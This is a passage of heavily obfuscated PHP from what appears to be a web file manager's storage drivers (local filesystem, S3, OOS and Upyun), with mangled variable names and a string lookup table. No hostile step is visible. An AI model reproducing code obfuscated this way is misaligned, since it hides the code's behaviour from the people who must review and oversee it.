return !1; } protected function infoChildren($∫º†”•˙, &$òøíïñõ, $‰“πø“˛ = true) { $ñΩ‘Äø” =& $_SERVER[ëæªã÷]; check_abort_echo(); $∫º†”•˙ = rtrim($∫º†”•˙, $ñΩ‘Äø”[8]) . $ñΩ‘Äø”[8]; if ($‰“πø“˛) { $∫º†”•˙ = $this->iconvSystem($∫º†”•˙); } if (!($‹◊’ŸÎ” = @opendir($∫º†”•˙))) { return; } while (($˛ûü›’Œ = readdir($‹◊’ŸÎ”)) !== !1) { if ($˛ûü›’Œ == $ñΩ‘Äø”[10] || $˛ûü›’Œ == $ñΩ‘Äø”[1348]) { continue; } $†âÉﬂúù = $∫º†”•˙ . $˛ûü›’Œ; if (is_file($†âÉﬂúù) || is_link($†âÉﬂúù)) { $òøíïñõ[$ñΩ‘Äø”[91]]++; $òøíïñõ[$ñΩ‘Äø”[90]] += filesize_64($†âÉﬂúù); } else { if (is_dir($†âÉﬂúù)) { $òøíïñõ[$ñΩ‘Äø”[92]]++; $this->infoChildren($†âÉﬂúù, $òøíïñõ, !1); } } } closedir($‹◊’ŸÎ”); } private function folderInfo($Êû“å‘, $•ÉãÆ·Î = false) { $ŸÙ±ÓÚñ =& $_SERVER[ëæªã÷]; $Êû“å‘ = rtrim($Êû“å‘, $ŸÙ±ÓÚñ[8]) . $ŸÙ±ÓÚñ[8]; $‡·Ôﬂã = $this->iconvApp($this->pathThis($Êû“å‘)); if ($•ÉãÆ·Î) { return array($ŸÙ±ÓÚñ[32] => $‡·Ôﬂã, $ŸÙ±ÓÚñ[88] => $this->getPathOuter($Êû“å‘), $ŸÙ±ÓÚñ[33] => $ŸÙ±ÓÚñ[89]); } $ÙŒÊî‘„ = array($ŸÙ±ÓÚñ[32] => $‡·Ôﬂã, $ŸÙ±ÓÚñ[88] => $this->getPathOuter($Êû“å‘), $ŸÙ±ÓÚñ[33] => $ŸÙ±ÓÚñ[89], $ŸÙ±ÓÚñ[203] => @filectime($Êû“å‘), $ŸÙ±ÓÚñ[96] => @filemtime($Êû“å‘), $ŸÙ±ÓÚñ[1351] => @fileatime($Êû“å‘), $ŸÙ±ÓÚñ[1352] => is_readable($Êû“å‘), $ŸÙ±ÓÚñ[1353] => is_writable($Êû“å‘), $ŸÙ±ÓÚñ[1354] => get_mode($Êû“å‘)); return $ÙŒÊî‘„; } private function fileInfo($ìÑÄù˜™, $Í˜ÍËØ• = false) { $”ÅÂ†·… =& $_SERVER[ëæªã÷]; $î∞Õùë≠ = $this->iconvApp($this->pathThis($ìÑÄù˜™)); if ($Í˜ÍËØ•) { return array($”ÅÂ†·…[32] => $î∞Õùë≠, $”ÅÂ†·…[88] => $this->getPathOuter($ìÑÄù˜™), $”ÅÂ†·…[33] => $”ÅÂ†·…[202], $”ÅÂ†·…[90] => $this->size($ìÑÄù˜™), $”ÅÂ†·…[177] => $this->ext($î∞Õùë≠)); } $µ°¯ù‹ë = array($”ÅÂ†·…[32] => $î∞Õùë≠, $”ÅÂ†·…[88] => $this->getPathOuter($ìÑÄù˜™), $”ÅÂ†·…[33] => $”ÅÂ†·…[202], $”ÅÂ†·…[203] => @filectime($ìÑÄù˜™), $”ÅÂ†·…[96] => @filemtime($ìÑÄù˜™), $”ÅÂ†·…[1351] => @fileatime($ìÑÄù˜™), $”ÅÂ†·…[90] => $this->size($ìÑÄù˜™), $”ÅÂ†·…[177] => $this->ext($î∞Õùë≠), $”ÅÂ†·…[1352] => is_readable($ìÑÄù˜™), $”ÅÂ†·…[1353] => is_writable($ìÑÄù˜™), $”ÅÂ†·…[1354] => get_mode($ìÑÄù˜™)); return $µ°¯ù‹ë; } public function exist($îüﬂ˙æí) { $îüﬂ˙æí = $this->iconvSystem($îüﬂ˙æí); return @file_exists($îüﬂ˙æí); } public function isFile($≥ÃÂó¨) { $≥ÃÂó¨ = $this->iconvSystem($≥ÃÂó¨); return @is_file($≥ÃÂó¨); } public function isFolder($´»ç√∑€) { $´»ç√∑€ = $this->iconvSystem($´»ç√∑€); return @is_dir($´»ç√∑€); } public function listPath($Ì¿á¶Ù…, $∑Æ¿êë† = false) { $±ç‘€·„ =& $_SERVER[ëæªã÷]; $Ì¿á¶Ù… = $this->iconvSystem($Ì¿á¶Ù…); $Ì¿á¶Ù… = rtrim($Ì¿á¶Ù…, $±ç‘€·„[8]) . $±ç‘€·„[8]; $ÏàÍ‰ÿœ = array($±ç‘€·„[87] => array(), $±ç‘€·„[86] => array()); if (!($‰£˝úÂ‹ = @opendir($Ì¿á¶Ù…))) { return $ÏàÍ‰ÿœ; } while (($—¥¡»∆≥ = readdir($‰£˝úÂ‹)) !== !1) { if ($—¥¡»∆≥ == $±ç‘€·„[10] || $—¥¡»∆≥ == $±ç‘€·„[1348]) { continue; } $ﬂçïâôŸ = $Ì¿á¶Ù… . $—¥¡»∆≥; if (is_file($ﬂçïâôŸ)) { $ÏàÍ‰ÿœ[$±ç‘€·„[86]][] = $this->fileInfo($ﬂçïâôŸ, $∑Æ¿êë†); } else { $ÏàÍ‰ÿœ[$±ç‘€·„[87]][] = $this->folderInfo($ﬂçïâôŸ, $∑Æ¿êë†); } } closedir($‰£˝úÂ‹); return $ÏàÍ‰ÿœ; } public function listAll($™îÜÂüµ, &$ıèèÂµŒ = array()) { $ı°ùœÛó =& $_SERVER[ëæªã÷]; $™îÜÂüµ = $this->iconvSystem($™îÜÂüµ); $™îÜÂüµ = rtrim($™îÜÂüµ, $ı°ùœÛó[8]) . $ı°ùœÛó[8]; if (!($íœ∂ÌœÓ = @opendir($™îÜÂüµ))) { return $ıèèÂµŒ; } while (($ñÃﬁñ‡Â = readdir($íœ∂ÌœÓ)) !== !1) { if ($ñÃﬁñ‡Â == $ı°ùœÛó[10] || $ñÃﬁñ‡Â == $ı°ùœÛó[1348]) { continue; } $¶É˚ãı≠ = $™îÜÂüµ . $ñÃﬁñ‡Â; if (is_dir($¶É˚ãı≠) && !is_link($¶É˚ãı≠)) { $ıèèÂµŒ[] = array($ı°ùœÛó[88] => $¶É˚ãı≠ . $ı°ùœÛó[8], $ı°ùœÛó[89] => 1, $ı°ùœÛó[96] => @filemtime($¶É˚ãı≠), $ı°ùœÛó[90] => 0); $this->listAll($¶É˚ãı≠, $ıèèÂµŒ); } else { $ıèèÂµŒ[] = array($ı°ùœÛó[88] => $¶É˚ãı≠, $ı°ùœÛó[89] => 0, $ı°ùœÛó[96] => @filemtime($¶É˚ãı≠), $ı°ùœÛó[90] => $this->size($¶É˚ãı≠)); } } closedir($íœ∂ÌœÓ); return $ıèèÂµŒ; } public function has($è‰µ˚ÎÙ, $˚öØƒ˚™ = false, $ı—ﬂÅÉÿ = true) { $ê¯Ó¶≤ã =& $_SERVER[ëæªã÷]; $è‰µ˚ÎÙ = $this->iconvSystem($è‰µ˚ÎÙ); $è‰µ˚ÎÙ = rtrim($è‰µ˚ÎÙ, $ê¯Ó¶≤ã[8]) . $ê¯Ó¶≤ã[8]; if (!($ˆùÓç°ﬁ = @opendir($è‰µ˚ÎÙ))) { return !1; } $·Û·º“ã = 0; $»€úÌ”˘ = 0; $ÃπíëÙ§ = 0; while (($õ¢≠≠úü = readdir($ˆùÓç°ﬁ)) !== !1) { if ($õ¢≠≠úü == $ê¯Ó¶≤ã[10] || $õ¢≠≠úü == $ê¯Ó¶≤ã[1348]) { continue; } $Øñî—Ê¢ = $è‰µ˚ÎÙ . $õ¢≠≠úü; if ($˚öØƒ˚™) { $ÃπíëÙ§++; if (@is_file($Øñî—Ê¢)) { $·Û·º“ã++; } else { $»€úÌ”˘++; } if ($ÃπíëÙ§ > 10000) { break; } continue; } if ($ı—ﬂÅÉÿ) { if (@is_file($Øñî—Ê¢)) { return !0; } } else { if (@is_dir($Øñî—Ê¢ . $ê¯Ó¶≤ã[8])) { return !0; } } } closedir($ˆùÓç°ﬁ); if ($˚öØƒ˚™) { return array($ê¯Ó¶≤ã[212] => $·Û·º“ã, $ê¯Ó¶≤ã[213] => $»€úÌ”˘); } return !1; } public function hashSimple($ŒéõÚ⁄ı) { $ÍΩ√ãæ„ =& $_SERVER[ëæªã÷]; if (!$ŒéõÚ⁄ı) { return md5($ÍΩ√ãæ„[12]); } $ŒéõÚ⁄ı = $this->iconvSystem($ŒéõÚ⁄ı); $Õ√©™ÚÙ = $this->size($ŒéõÚ⁄ı); $–ÆÈâ…◊ = 200; $£üÈ≠æ¥ = 50; if ($Õ√©™ÚÙ <= $–ÆÈâ…◊ * $£üÈ≠æ¥) { return $this->hashMd5($ŒéõÚ⁄ı) . $Õ√©™ÚÙ; } $Ì«˜¶ÎŒ = $ÍΩ√ãæ„[12]; $⁄˝´±¢‡ = intval($Õ√©™ÚÙ / $£üÈ≠æ¥); $îı˜¥√ç = fopen($ŒéõÚ⁄ı, $ÍΩ√ãæ„[1355]); if (!$îı˜¥√ç) { return $Ì«˜¶ÎŒ; } for ($Ì«√»Ú≤ = 0; $Ì«√»Ú≤ < $£üÈ≠æ¥; $Ì«√»Ú≤++) { fseek_64($îı˜¥√ç, $⁄˝´±¢‡ * $Ì«√»Ú≤); $Ì«˜¶ÎŒ .= fread($îı˜¥√ç, $–ÆÈâ…◊); } fseek_64($îı˜¥√ç, $Õ√©™ÚÙ - $–ÆÈâ…◊); $Ì«˜¶ÎŒ .= fread($îı˜¥√ç, $–ÆÈâ…◊); fclose($îı˜¥√ç); return md5($Ì«˜¶ÎŒ) . $Õ√©™ÚÙ; } public function getContent($Á⁄Ü£∞ë) { $Á⁄Ü£∞ë = $this->iconvSystem($Á⁄Ü£∞ë); return file_get_contents($Á⁄Ü£∞ë); } public function setContent($ä∑èô£â, $ê“ÍÊ´… = '') { $ä∑èô£â = $this->iconvSystem($ä∑èô£â); $ù÷ ¡©® = @file_put_contents($ä∑èô£â, $ê“ÍÊ´…, LOCK_EX); clearstatcache(); @chmod($ä∑èô£â, $this->pathAuth); return $ù÷ ¡©® === !1 ? !1 : !0; } public function fileSubstr($´ãÎ∏Ø´, $Ñ¡ÊŒÙÜ = 0, $Ü–äıå√ = false) { $¢±ÌäÂπ =& $_SERVER[ëæªã÷]; $´ãÎ∏Ø´ = $this->iconvSystem($´ãÎ∏Ø´); if ($Ü–äıå√ === !1) { $Ü–äıå√ = $this->size($´ãÎ∏Ø´); } if ($Ü–äıå√ <= 0) { return $¢±ÌäÂπ[12]; } $∏Ã∞Öê∂ = fopen($´ãÎ∏Ø´, $¢±ÌäÂπ[1355]); if (!$∏Ã∞Öê∂) { return !1; } fseek_64($∏Ã∞Öê∂, $Ñ¡ÊŒÙÜ); $çÿ Ê≤≠ = fread($∏Ã∞Öê∂, $Ü–äıå√); fclose($∏Ã∞Öê∂); return $çÿ Ê≤≠; } public function upload($çó»ÿ ç, $∞‘°å∫ë, $ÑÏ≠‘ËÈ = false, $ã™Â’ÊÉ = REPEAT_REPLACE) { if ($ÑÏ≠‘ËÈ) { return $this->moveFile($∞‘°å∫ë, $çó»ÿ ç); } return $this->copyFile($∞‘°å∫ë, $çó»ÿ ç); } public function setModifyTime($Ô≈Åï∂÷, $õª‰°¥® = '') { @touch($Ô≈Åï∂÷, intval($õª‰°¥®)); } public function download($Õµüéâ , $˘Ø°⁄˛¿) { return $this->iconvSystem($Õµüéâ ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ˆ√Œ∆«õ) { parent::__construct($ˆ√Œ∆«õ); $this->signatureVersion($_SERVER[ëæªã÷][221]); } public function fileOutLink($èŒŸ¢öÿ) { $ÈÑåñø¯ =& $_SERVER[ëæªã÷]; if (substr($èŒŸ¢öÿ, 0, 7) == $ÈÑåñø¯[1299]) { $èŒŸ¢öÿ = $ÈÑåñø¯[1300] . substr($èŒŸ¢öÿ, 7); } header($ÈÑåñø¯[168] . $èŒŸ¢öÿ); die; } } goto eﬂ√ÎùÀâ°; f†åëàπ·Ù: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¥§à•Œ™) { parent::__construct($¥§à•Œ™); } public function uploadFormData($ﬁ·”ﬂÀÃ, $∆¯ÓäÏ∞ = 3600) { $ô¥ØêÒ  =& $_SERVER[ëæªã÷]; $ÍíØÆÌ∂ = $ô¥ØêÒ [201]; $˘∏ëπ≤™ = $ô¥ØêÒ [1320]; $Ñ§≠ô¢™ = $ô¥ØêÒ [72]; $ÊƒÔı¿ô = gmdate($ô¥ØêÒ [1321]); $ã⁄ò˚ù√ = gmdate($ô¥ØêÒ [731]); $§ﬂêã„´ = $ô¥ØêÒ [1322]; $Î«¿∫•Â = $∆¯ÓäÏ∞ . $ô¥ØêÒ [12]; $«∫«ÕÁÅ = $ô¥ØêÒ [1284]; $¡Î¨√Ô = array($this->accessKey, $ã⁄ò˚ù√, $this->region, $Ñ§≠ô¢™, $§ﬂêã„´); $ÈË˛∫ÿ = implode($ô¥ØêÒ [8], $¡Î¨√Ô); $Ó€éÍ¶ì = array($ô¥ØêÒ [1286] => gmdate($ô¥ØêÒ [1285], strtotime($ô¥ØêÒ [1323])), $ô¥ØêÒ [1287] => array(array($ô¥ØêÒ [1289] => $this->bucket), array($ô¥ØêÒ [1288] => $ÍíØÆÌ∂), array($ô¥ØêÒ [1290], $ô¥ØêÒ [1291], $ô¥ØêÒ [12]), array($ô¥ØêÒ [1290], $ô¥ØêÒ [1324], $ô¥ØêÒ [12]), array($ô¥ØêÒ [1290], $ô¥ØêÒ [1325], $ô¥ØêÒ [12]), array($ô¥ØêÒ [1292] => $«∫«ÕÁÅ), array($ô¥ØêÒ [1326] => $ÈË˛∫ÿ), array($ô¥ØêÒ [1327] => $˘∏ëπ≤™), array($ô¥ØêÒ [1328] => $ÊƒÔı¿ô), array($ô¥ØêÒ [1329] => $Î«¿∫•Â))); $Ãù§ÉÛò = base64_encode(json_encode($Ó€éÍ¶ì)); $¥û◊ø⁄à = hash_hmac($ô¥ØêÒ [1330], $ã⁄ò˚ù√, $ô¥ØêÒ [1331] . $this->secret, !0); $º’ƒÑâı = hash_hmac($ô¥ØêÒ [1330], $this->region, $¥û◊ø⁄à, !0); $ƒ≠Èß–‘ = hash_hmac($ô¥ØêÒ [1330], $Ñ§≠ô¢™, $º’ƒÑâı, !0); $”Ÿ÷í®Ö = hash_hmac($ô¥ØêÒ [1330], $§ﬂêã„´, $ƒ≠Èß–‘, !0); $ŒÿÒú€ = hash_hmac($ô¥ØêÒ [1330], $Ãù§ÉÛò, $”Ÿ÷í®Ö); $£≥Ÿº‘ß = array($ô¥ØêÒ [220] => $ô¥ØêÒ [12], $ô¥ØêÒ [1332] => $ô¥ØêÒ [12], $ô¥ØêÒ [1288] => $ÍíØÆÌ∂, $ô¥ØêÒ [1292] => $«∫«ÕÁÅ, $ô¥ØêÒ [1296] => $Ãù§ÉÛò, $ô¥ØêÒ [1333] => $ÈË˛∫ÿ, $ô¥ØêÒ [1334] => $˘∏ëπ≤™, $ô¥ØêÒ [1335] => $ÊƒÔı¿ô, $ô¥ØêÒ [1336] => $Î«¿∫•Â, $ô¥ØêÒ [1337] => $ŒÿÒú€, $ô¥ØêÒ [184] => $this->getHost()); return $£≥Ÿº‘ß; } public function multiUploadFormData($Ñ÷ÃäÊê, $ÀÃ–ì¿≈ = 3600) { $ß¸ôõ¨ƒ =& $_SERVER[ëæªã÷]; $ﬁ≠‘◊ï¯ = gmdate($ß¸ôõ¨ƒ[1416]); $ì¿Ôõ§ë = array(); $º¿Àæäú = $this->client->getUploadId($this->bucket, $Ñ÷ÃäÊê, $ì¿Ôõ§ë); if (!$º¿Àæäú) { return !1; } return array($ß¸ôõ¨ƒ[228] => $º¿Àæäú, $ß¸ôõ¨ƒ[184] => $this->getHost() . $ß¸ôõ¨ƒ[8] . $this->pathEncode($Ñ÷ÃäÊê), $ß¸ôõ¨ƒ[229] => $ﬁ≠‘◊ï¯, $ß¸ôõ¨ƒ[105] => $Ñ÷ÃäÊê); } public function multiUploadAuthData($¨”úÂ≥µ, $πÃäΩ›¡ = array()) { $∆üÛ“±Ê =& $_SERVER[ëæªã÷]; $Œé¨Ûõ≥ = isset($πÃäΩ›¡[$∆üÛ“±Ê[177]]) ? $πÃäΩ›¡[$∆üÛ“±Ê[177]] : $∆üÛ“±Ê[12]; $é·Å∂∂Í = $πÃäΩ›¡[$∆üÛ“±Ê[105]]; unset($πÃäΩ›¡[$∆üÛ“±Ê[105]]); if (isset($πÃäΩ›¡[$∆üÛ“±Ê[230]])) { return $this->listUploadParts($é·Å∂∂Í, $πÃäΩ›¡); } $ƒ‹˘•À› = array(); if (isset($πÃäΩ›¡[$∆üÛ“±Ê[1417]])) { $ƒ‹˘•À›[$∆üÛ“±Ê[1418]] = $πÃäΩ›¡[$∆üÛ“±Ê[1417]]; } $÷ñÉø§í = explode($∆üÛ“±Ê[186], $this->getHost()); $µÄç„éÊ = array($∆üÛ“±Ê[1419] => $÷ñÉø§í[1], $∆üÛ“±Ê[1420] => $∆üÛ“±Ê[12], $∆üÛ“±Ê[220] => $∆üÛ“±Ê[128], $∆üÛ“±Ê[1332] => $πÃäΩ›¡[$∆üÛ“±Ê[90]]); $ŸªÅÇß÷ = $∆üÛ“±Ê[233]; $Ø‰Û∆Ã¸ = $∆üÛ“±Ê[8] . $this->pathEncode($é·Å∂∂Í) . $Œé¨Ûõ≥; $ñÑ»ö∑¶ = $this->client->__getSignatureV4($ƒ‹˘•À›, $µÄç„éÊ, $ŸªÅÇß÷, $Ø‰Û∆Ã¸); if (strpos($Œé¨Ûõ≥, $∆üÛ“±Ê[232]) === 0) { if (isset($ƒ‹˘•À›[$∆üÛ“±Ê[1418]])) { $‘Ê≤»Õñ = $ƒ‹˘•À›[$∆üÛ“±Ê[1418]]; } else { if (isset($ñÑ»ö∑¶[$∆üÛ“±Ê[1418]])) { $‘Ê≤»Õñ = $ñÑ»ö∑¶[$∆üÛ“±Ê[1418]]; } else { $‘Ê≤»Õñ = hash($∆üÛ“±Ê[1330], $∆üÛ“±Ê[12]); } } return array($∆üÛ“±Ê[238] => $ñÑ»ö∑¶[$∆üÛ“±Ê[238]], $∆üÛ“±Ê[1418] => $‘Ê≤»Õñ, $∆üÛ“±Ê[229] => $ñÑ»ö∑¶[$∆üÛ“±Ê[1421]]); } return $ñÑ»ö∑¶[$∆üÛ“±Ê[238]]; } public function listUploadParts($Ø∂ÚÖêã, $ü«·Ø≤≈ = array()) { $ì´—èß≠ =& $_SERVER[ëæªã÷]; $Ω⁄ΩëÄÉ = str_replace($ì´—èß≠[239], $ì´—èß≠[12], $ü«·Ø≤≈[$ì´—èß≠[177]]); $—ñù£˛â = $this->client->listParts($this->bucket, $Ø∂ÚÖêã, $Ω⁄ΩëÄÉ); if (!$—ñù£˛â) { return !1; } $–Ïç“»« = $ì´—èß≠[1422]; foreach ($—ñù£˛â as $¶®°€á€) { $–Ïç“»« .= $ì´—èß≠[1423] . "\x3c\120\141\x72\164\116\165\155\x62\x65\162\x3e{$¶®°€á€[$ì´—èß≠[1377]]}\74\57\120\x61\x72\x74\x4e\x75\155\x62\x65\162\x3e\12" . "\x3c\105\x54\141\147\x3e{$¶®°€á€[$ì´—èß≠[1378]]}\x3c\57\x45\124\x61\147\76\xa" . $ì´—èß≠[1424]; } $–Ïç“»« .= $ì´—èß≠[1425]; $¢´È‹í€ = array(); $¶ô≈„Œ≈ = explode($ì´—èß≠[186], $this->getHost()); $Ì†ˆ…Ô = array($ì´—èß≠[1419] => $¶ô≈„Œ≈[1], $ì´—èß≠[220] => $ì´—èß≠[128], $ì´—èß≠[1332] => strlen($–Ïç“»«)); $«∫ıùõ∂ = $ì´—èß≠[231]; $úÍÃ…óÏ = $ì´—èß≠[8] . $this->pathEncode($Ø∂ÚÖêã) . $ü«·Ø≤≈[$ì´—èß≠[177]]; $¿ÁÂû˜ß = $this->client->__getSignatureV4($¢´È‹í€, $Ì†ˆ…Ô, $«∫ıùõ∂, $úÍÃ…óÏ, $–Ïç“»«); return array($ì´—èß≠[238] => $¿ÁÂû˜ß[$ì´—èß≠[238]], $ì´—èß≠[229] => $¿ÁÂû˜ß[$ì´—èß≠[1421]], $ì´—èß≠[240] => $—ñù£˛â, $ì´—èß≠[1418] => $¿ÁÂû˜ß[$ì´—èß≠[1418]]); } public function link($⁄º‘„≈, $π„∫ÒõÑ = array()) { return parent::link($⁄º‘„≈, $π„∫ÒõÑ); } public function fileOut($‘˛∑ÆÈ”, $µ¢É‚ÖÍ = false, $ﬂœ€µ™µ = false, $ÀÁÜÎü— = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ëæªã÷][1426])) { return parent::fileOutServer($‘˛∑ÆÈ”, $µ¢É‚ÖÍ, $ﬂœ€µ™µ, $ÀÁÜÎü—); } parent::fileOut($‘˛∑ÆÈ”, $µ¢É‚ÖÍ, $ﬂœ€µ™µ, $ÀÁÜÎü—); } public function fileOutImage($Î™Â£¸•, $ñú≤«⁄° = 250) { if (strstr($this->endpoint, $_SERVER[ëæªã÷][1426])) { return parent::fileOutImageServer($Î™Â£¸•, $ñú≤«⁄°); } parent::fileOutImage($Î™Â£¸•, $ñú≤«⁄°); } public function fileOutLink($Õ∆Œõæ˝) { $∏À¡Ó‚≈ =& $_SERVER[ëæªã÷]; if (substr($Õ∆Œõæ˝, 0, 7) == $∏À¡Ó‚≈[1299]) { $Õ∆Œõæ˝ = $∏À¡Ó‚≈[1300] . substr($Õ∆Œõæ˝, 7); } header($∏À¡Ó‚≈[168] . $Õ∆Œõæ˝); die; } public function getHost() { $ÃëÔ«ﬂÌ =& $_SERVER[ëæªã÷]; $úıéÓ◊≈ = str_rtrim(parent::getHost(), $ÃëÔ«ﬂÌ[8] . $this->bucket); $úıéÓ◊≈ = explode($ÃëÔ«ﬂÌ[186], $úıéÓ◊≈); return $úıéÓ◊≈[0] . $ÃëÔ«ﬂÌ[186] . $this->bucket . $ÃëÔ«ﬂÌ[10] . $úıéÓ◊≈[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($«◊•Õ‚˘, $®Ç±·ï£ = 0) { parent::__construct(); $this->source = $«◊•Õ‚˘; $this->sourceSize = $®Ç±·ï£; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($îëÂó≥å = false) { return $this->sourceSize; } public function getContent($¨‘∆∞úË = false) { return $this->fileSubstr($¨‘∆∞úË, 0, $this->sourceSize); } public function fileSubstr($’Ω‹éΩ˘ = false, $®ññíëœ = 0, $—˝ÁçØê = 0) { if (!$—˝ÁçØê) { $—˝ÁçØê = $this->sourceSize; } $π‰¨ºü◊ = $this->sourceSize - $®ññíëœ; if ($—˝ÁçØê >= $π‰¨ºü◊) { $—˝ÁçØê = $π‰¨ºü◊; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $®ññíëœ, $—˝ÁçØê); } if ($this->sourceType == self::TYPE_FILE) { if ($—˝ÁçØê <= 0) { return $_SERVER[ëæªã÷][12]; } $íŒß∂Ö◊ = ftell($this->source); fseek_64($this->source, $íŒß∂Ö◊ + $®ññíëœ); $¡µÎ∫Õ˘ = @fread($this->source, $—˝ÁçØê); fseek_64($this->source, $íŒß∂Ö◊); return $¡µÎ∫Õ˘; } } public function hashMd5($±Òâ‹–© = false) { return md5($this->getContent()); } public static function hash($Ÿµ€ﬂï•, $é∏Œê¬ı = 0) { $…Ù¶üç≈ = new PathDriverStream($Ÿµ€ﬂï•, $é∏Œê¬ı); return $…Ù¶üç≈->hashSimple($Ÿµ€ﬂï•); } public static function md5($¡á∏®¥˘, $˛øﬂ√‚‚ = 0) { $»ï‹≈¥Ö = new PathDriverStream($¡á∏®¥˘, $˛øﬂ√‚‚); return $»ï‹≈¥Ö->hashMd5($¡á∏®¥˘); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\x2f\166\x30\x2e\141\x70\x69\x2e\x75\x70\x79\165\x6e\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($˛ó≠ûä”) { parent::__construct(); $this->_init($˛ó≠ûä”); } public function _init($˛Øåë‘°) { $Ç–¸¬ëŸ =& $_SERVER[ëæªã÷]; foreach ($˛Øåë‘° as $ÊÏÇ íÃ => $±∑°√óÔ) { if (isset($this->{$ÊÏÇ íÃ})) { $this->{$ÊÏÇ íÃ} = $±∑°√óÔ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ç–¸¬ëŸ[1427] . LNG($Ç–¸¬ëŸ[1358])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($üà÷Ò†«, $£≤à–‰¯ = "\107\x45\124") { $ÓíÌÀö§ =& $_SERVER[ëæªã÷]; $¨‹∑Ÿîè = gmdate($ÓíÌÀö§[1391]); $ô‘»©üù = base64_encode(hash_hmac($ÓíÌÀö§[1428], "{$£≤à–‰¯}\46{$üà÷Ò†«}\46{$¨‹∑Ÿîè}", md5("{$this->userpass}"), !0)); $ÈŸ®‘µ÷ = array("\101\165\x74\x68\157\x72\151\172\141\164\x69\157\x6e\72\x55\x50\x59\125\116\40{$this->username}\72{$ô‘»©üù}", "\104\141\x74\x65\x3a{$¨‹∑Ÿîè}"); return $ÈŸ®‘µ÷; } public function ussRequest($á¡Ã˜Ω”, $€å´óéØ = "\x47\x45\x54", $¬Ü‰Êﬁä = false, $ô£†âÑç = false, $Ωûﬂ∑◊« = false) { $¿ë÷äÉù =& $_SERVER[ëæªã÷]; $á¡Ã˜Ω” = trim($á¡Ã˜Ω”, $¿ë÷äÉù[8]); $©Ñ≈Ÿåˆ = "\57{$this->bucket}\x2f{$á¡Ã˜Ω”}"; $»±ÂÁ›π = $this->ussHeaders($©Ñ≈Ÿåˆ, $€å´óéØ); if ($ô£†âÑç) { $»±ÂÁ›π = array_merge($»±ÂÁ›π, $ô£†âÑç); } $Ä¬ºÑè = url_request($this->endpoint . $©Ñ≈Ÿåˆ, $€å´óéØ, $¬Ü‰Êﬁä, $»±ÂÁ›π, $Ωûﬂ∑◊«); if (!$Ä¬ºÑè) { return array($¿ë÷äÉù[1165] => !1, $¿ë÷äÉù[1167] => $¿ë÷äÉù[1429]); } if (strtolower($€å´óéØ) == $¿ë÷äÉù[199] || in_array($Ä¬ºÑè[$¿ë÷äÉù[1165]], array($¿ë÷äÉù[1284], $¿ë÷äÉù[1430]))) { $¬Ü‰Êﬁä = $Ä¬ºÑè[$¿ë÷äÉù[1431]]; } else { $¬Ü‰Êﬁä = json_decode($Ä¬ºÑè[$¿ë÷äÉù[1167]], !0); if (!$¬Ü‰Êﬁä) { $¬Ü‰Êﬁä = $Ä¬ºÑè[$¿ë÷äÉù[1167]]; } else { if (!$Ä¬ºÑè[$¿ë÷äÉù[730]] && isset($¬Ü‰Êﬁä[$¿ë÷äÉù[1432]])) { $¬Ü‰Êﬁä = $¬Ü‰Êﬁä[$¿ë÷äÉù[1432]]; } } } return array($¿ë÷äÉù[1165] => $Ä¬ºÑè[$¿ë÷äÉù[730]], $¿ë÷äÉù[1167] => $¬Ü‰Êﬁä); } public function mkfile($«õ·±Ò‚, $ëÒèô≤Î = '', $◊Í√êˆî = REPEAT_RENAME) { if ($this->setContent($«õ·±Ò‚, $ëÒèô≤Î)) { return $this->getPathOuter($«õ·±Ò‚); } return !1; } public function mkdir($•ÖÙ€∫Æ, $˛¿ÚÕä€ = REPEAT_SKIP) { $ˆê·≤ÌÊ =& $_SERVER[ëæªã÷]; $Å∆æÄ˝Æ = trim($•ÖÙ€∫Æ, $ˆê·≤ÌÊ[8]); if ($this->_isFolder($Å∆æÄ˝Æ)) { return $this->getPathOuter($Å∆æÄ˝Æ); } $ŸÇÃËù‡ = array($ˆê·≤ÌÊ[1433]); $‡¡„Å˙ﬁ = $this->ussRequest($Å∆æÄ˝Æ, $ˆê·≤ÌÊ[231], !1, $ŸÇÃËù‡); return $‡¡„Å˙ﬁ[$ˆê·≤ÌÊ[1165]] ? $this->getPathOuter($Å∆æÄ˝Æ) : !1; } public function copyFile($∏œù‰†è, $ΩΩÀ–êª) { $ªá†Ã„å =& $_SERVER[ëæªã÷]; $ö∏æË¯√ = array($ªá†Ã„å[1434] . "\x2f{$this->bucket}\57{$∏œù‰†è}", $ªá†Ã„å[1435]); $Ô¢É∑Ìû = $this->ussRequest($ΩΩÀ–êª, $ªá†Ã„å[233], !1, $ö∏æË¯√); return $Ô¢É∑Ìû[$ªá†Ã„å[1165]] ? !0 : $this->getPathOuter($ΩΩÀ–êª); } public function moveFile($ïÊÇíÎ¨, $≠ïë˜úœ) { $…’ùı≈Û =& $_SERVER[ëæªã÷]; $Ï˛Øô˚¡ = array($…’ùı≈Û[1436] . "\x2f{$this->bucket}\x2f{$ïÊÇíÎ¨}", $…’ùı≈Û[1435]); $˛◊∆»øΩ = $this->ussRequest($≠ïë˜úœ, $…’ùı≈Û[233], !1, $Ï˛Øô˚¡); return $˛◊∆»øΩ[$…’ùı≈Û[1165]] ? !0 : $this->getPathOuter($≠ïë˜úœ); } public function delFile($ƒ–ŒÔéœ) { $ÎƒÁ¸¢˜ =& $_SERVER[ëæªã÷]; $úö‰Ï Â = $this->ussRequest($ƒ–ŒÔéœ, $ÎƒÁ¸¢˜[1437]); return $úö‰Ï Â[$ÎƒÁ¸¢˜[1165]] ? !0 : !1; } public function delFolder($¿ìùºÊ›) { $≈‚ÒäâÜ =& $_SERVER[ëæªã÷]; if (!$this->exist($¿ìùºÊ›)) { return !0; } $this->listItemCache = !1; $ãçÊ™Ä˚ = $ñ¥†˙ŒÕ = array(); 